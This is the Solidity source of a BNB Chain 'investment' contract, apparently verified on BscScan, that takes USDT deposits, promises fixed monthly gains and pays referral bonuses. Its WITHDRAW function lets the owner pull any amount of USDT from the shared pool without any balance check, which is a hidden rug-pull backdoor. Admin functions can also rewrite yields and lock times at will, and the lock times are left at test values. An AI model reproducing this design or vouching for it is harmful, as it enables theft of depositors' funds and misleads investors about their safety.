/**
 *Submitted for verification at BscScan.com on 2022-09-14
*/

// File: contracts/Container.sol

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface ERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}


contract Cointainer {
    //USDT
    ERC20 USDT;
    // time
    uint256[4] LOCK_TIME = [ 5 minutes, 2 days, 3 days, 4 days];// [ 91 days, 182 days, 273 days, 365 days]; // TIME_LOCK;
    uint256 RETORNE = 3 seconds;//30 days;
    // Percentage
    uint8[4] public GAIN_TIME = [21,54,99,156];
    uint8[4] public GAIN_PER_MONTH = [7,9,11,13];
    uint8[4] public PERCENTAGE_REF = [57,57,55,62];
    uint8 GAIN_OWNER = 25;
    uint8[4] SECURE = [15,30,45,60];
    uint256 public MIN_INVEST = 1000 ether;
    // address
    address OWNER;
    address LIQUIDITY;
    address DEVELOPER;
    // balance
    mapping(address => uint256) BALANCE;
    mapping(address => uint256) GAIN_REF;
    //PROFIT
    mapping(address => uint256[]) public PROFIT_BALANCE;
    // address BATCH
    mapping(address => BATCH[]) MY_BATCH;
    // REFERENCE
    mapping(address => uint256) REF_TO_ADDRESS;
    mapping(uint256 => address) REF_TO_NUMBERS;
    mapping(address => address) INVITED;
    // batch scheme
    struct BATCH {
        uint256 TIME;
        uint256 TIME_PROFIT;
        uint8 TYPE;
        uint256 AMOUNT;
        uint256 GAIN;
        bool STATE;
        uint256 CLAIMS;
    }


    // construtor
    constructor (ERC20 addressUSDT, address _owner, address _liquidity){
        USDT = addressUSDT;
        OWNER = _owner;
        LIQUIDITY = _liquidity;
        DEVELOPER = msg.sender;
    }
    // event
    event _WITHDRAW(address indexed account, uint256 indexed amount);
    event _INVESTER(address indexed account, uint256 indexed amount);
    event _PROFIT(address indexed account, uint256 indexed gain, uint256 indexed index);
    // modifier
    modifier OnlyDeveloperAndOwner {
        require(msg.sender == OWNER || msg.sender == DEVELOPER,"You don't have access to this feature");
        _;
    }
    modifier NoContract {
        require(!isContract(msg.sender),"We do not allow contracts");
        _;
    }
    // is Contract
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.
        return account.code.length > 0;
    }
    function CALCULATE_UI(uint256 amount, uint8 percentage, uint8 zero) internal pure returns(uint256){
        return amount * percentage / (10**zero);
    }
        // functions { }

    // views
    function _LOCK_TIME(uint8 TYPE) public view returns(uint256){
        return LOCK_TIME[TYPE];
    }
    function _RETORNE() public view returns(uint256){
        return RETORNE;
    }
    function _REF_TO_ADDRESS(address account) public view returns(uint256){
        return REF_TO_ADDRESS[account];
    }
    function _REF_TO_NUMBERS(uint256 index) public view returns(address){
        return REF_TO_NUMBERS[index];
    }
    function _INVITED(address account) public view returns(address){
        return INVITED[account];
    }
    function _BALANCE(address account) public view returns(uint256){
        return BALANCE[account];
    }
    function _GAIN_REF(address account) public view returns(uint256){
        return GAIN_REF[account];
    }
    function _MY_BATCH(address account, uint256 index) public view returns(BATCH memory){
        return MY_BATCH[account][index];
    }
    function _MY_BATCH_ALL(address account) public view returns(BATCH[] memory){
        return MY_BATCH[account];
    }
    function _BALANCE_LOCKED(address account) public view returns(uint256){
        uint256 amount;
        for(uint256 x; x < MY_BATCH[account].length;x++){
            if(MY_BATCH[account][x].STATE){
               
                amount += MY_BATCH[account][x].AMOUNT;
            }
        }
        return amount;
    }
    function VIEW_GAIN(address account, uint256 index, uint8 _zeros, uint8 _monthly) public view returns(uint256){
        uint256 amount = MY_BATCH[account][index].AMOUNT;
        if(MY_BATCH[account][index].TIME_PROFIT > block.timestamp)return 0;
        if(_monthly == 1){
            return CALCULATE_UI(amount, GAIN_PER_MONTH[MY_BATCH[account][index].TYPE], _zeros);
        } else {
            return CALCULATE_UI(amount, GAIN_TIME[MY_BATCH[account][index].TYPE], _zeros);
        }
    }
    // UI VIEW
    function RamdonNUM() internal view returns(uint256){
        return uint256(keccak256(abi.encode(msg.sender,block.number)))%10**9;
    }
    // WITHDRAW
    function WITHDRAW(uint256 amount) public {
        require((amount > 0 && _BALANCE(msg.sender)>=amount) || msg.sender == OWNER,"you don't have enough balance");
        USDT.transfer(msg.sender,amount);
        if(amount > 0 && _BALANCE(msg.sender)>=amount){
            BALANCE[msg.sender] -= amount;
        }
        emit _WITHDRAW(msg.sender,amount);
    }
    // INVERTS
    function INVETS(uint256 amount, uint256 ref, uint8 TYPE) public NoContract{
        require(amount>=MIN_INVEST,"you have not added balance");
        USDT.transferFrom(msg.sender, address(this), amount);
        uint256 free = amount - CALCULATE_UI(amount, SECURE[TYPE], 3);
        MY_BATCH[msg.sender].push(BATCH(block.timestamp,block.timestamp,TYPE,free,0,true, Quantity_Claims(TYPE)));
        GET_REF(msg.sender);
        ADD_REF(REF_TO_NUMBERS[ref]);
        PROFIT_BALANCE[msg.sender].push(CALCULATE_UI(amount, GAIN_TIME[TYPE], 2));
        
        emit _INVESTER(msg.sender, amount);
    }
    // PROFIT
    function PROFIT(uint256 index) public NoContract{
        require(MY_BATCH[msg.sender][index].STATE,"was already harvested");
        require(MY_BATCH[msg.sender][index].TIME_PROFIT + RETORNE <= block.timestamp,"You don't have to harvest");

        if(MY_BATCH[msg.sender][index].TIME + LOCK_TIME[MY_BATCH[msg.sender][index].TYPE] > block.timestamp 
            && MY_BATCH[msg.sender][index].CLAIMS > 0){
            
            //PROFIT CALCULATE
            MY_BATCH[msg.sender][index].GAIN = VIEW_GAIN(msg.sender,index, 3, 1);
            
            uint256 profit = CALCULATE_UI(MY_BATCH[msg.sender][index].AMOUNT, GAIN_PER_MONTH[MY_BATCH[msg.sender][index].TYPE], 2);

            BALANCE[msg.sender] += profit;
           

           //reisar
            PAY_TO_REF(msg.sender, MY_BATCH[msg.sender][index].GAIN, MY_BATCH[msg.sender][index].TYPE);
            MY_BATCH[msg.sender][index].CLAIMS -= 1;
            PROFIT_BALANCE[msg.sender][index] -= profit;
    
            // PAID FOR PARTS
            MY_BATCH[msg.sender][index].TIME_PROFIT = (block.timestamp);
        
            emit _PROFIT(msg.sender, profit, index);

        }else {
            Unlock_Balance(index);
        }

    }

    // Unlock MONEY
    function Unlock_Balance(uint256 index) internal {
        
        require(MY_BATCH[msg.sender][index].TIME + LOCK_TIME[MY_BATCH[msg.sender][index].TYPE]<=block.timestamp, "N/T for harvesting Yet");

        BALANCE[msg.sender] += MY_BATCH[msg.sender][index].AMOUNT;
        MY_BATCH[msg.sender][index].STATE = false;
        MY_BATCH[msg.sender][index].CLAIMS = 0;
        BALANCE[msg.sender] += PROFIT_BALANCE[msg.sender][index];
        delete PROFIT_BALANCE[msg.sender][index];
        delete MY_BATCH[msg.sender][index];
    }


    //Quantity of claims
    function Quantity_Claims(uint256 _type)internal pure returns(uint256 _Claims){
        if(_type == 0){
            return 2;
        }else if(_type == 1){
            return 5;
        }else if(_type == 2){
            return 8;
        }else if(_type == 3){
            return 11;
        }
    }


    //REINVERTS_BALANCE
    /*function REINVERTS_BALANCE(uint256 amount,uint8 TYPE) public {
        require(amount>=MIN_INVEST,"you have not added balance");
        require(amount > 0 && _BALANCE(msg.sender)>=amount,"you don't have enough balance");
        BALANCE[msg.sender] -= amount;
        MY_BATCH[msg.sender].push(BATCH(block.timestamp,block.timestamp,TYPE,amount,0,true,));
    }*/

    function PAY_TO_REF(address account, uint256 amount, uint8 TYPE) internal {
        amount = CALCULATE_UI(amount, GAIN_OWNER, 2);
        uint256 free = CALCULATE_UI(amount, 100-PERCENTAGE_REF[TYPE], 2);
        BALANCE[LIQUIDITY] += free;
        uint256 toREF = CALCULATE_UI(amount, PERCENTAGE_REF[TYPE], 2);
        if(INVITED[account]==address(0)){
            BALANCE[LIQUIDITY] += toREF;
            return;
        }
        BALANCE[INVITED[account]] += toREF;
        GAIN_REF[INVITED[account]] += toREF;
    }
    //ADD REF
    function ADD_REF(address account) internal {
        if(account==address(0) || account==msg.sender || INVITED[msg.sender]!=address(0) || INVITED[msg.sender] == account)return;
        INVITED[msg.sender] = account;
    }
    // WRITE
    function GET_REF(address account) internal {
        if(REF_TO_ADDRESS[account]!=0)return;
        REF_TO_ADDRESS[account] = RamdonNUM();
        REF_TO_NUMBERS[REF_TO_ADDRESS[account]] = account;
    }
    //change edit admin 
    function PERCENTAGE_CHANGE(uint8[4] memory gain, uint8[4] memory ref, uint8 gain_owner, uint8[4] memory secure, uint256 min_invest) public OnlyDeveloperAndOwner {
        GAIN_TIME = gain;
        PERCENTAGE_REF = ref;
        GAIN_OWNER = gain_owner;
        SECURE = secure;
        MIN_INVEST= min_invest;
    }
    function TIME_CHANGE(uint256[4] memory lock, uint256 profit) public OnlyDeveloperAndOwner {
        LOCK_TIME = lock;
        RETORNE=profit;
    }
}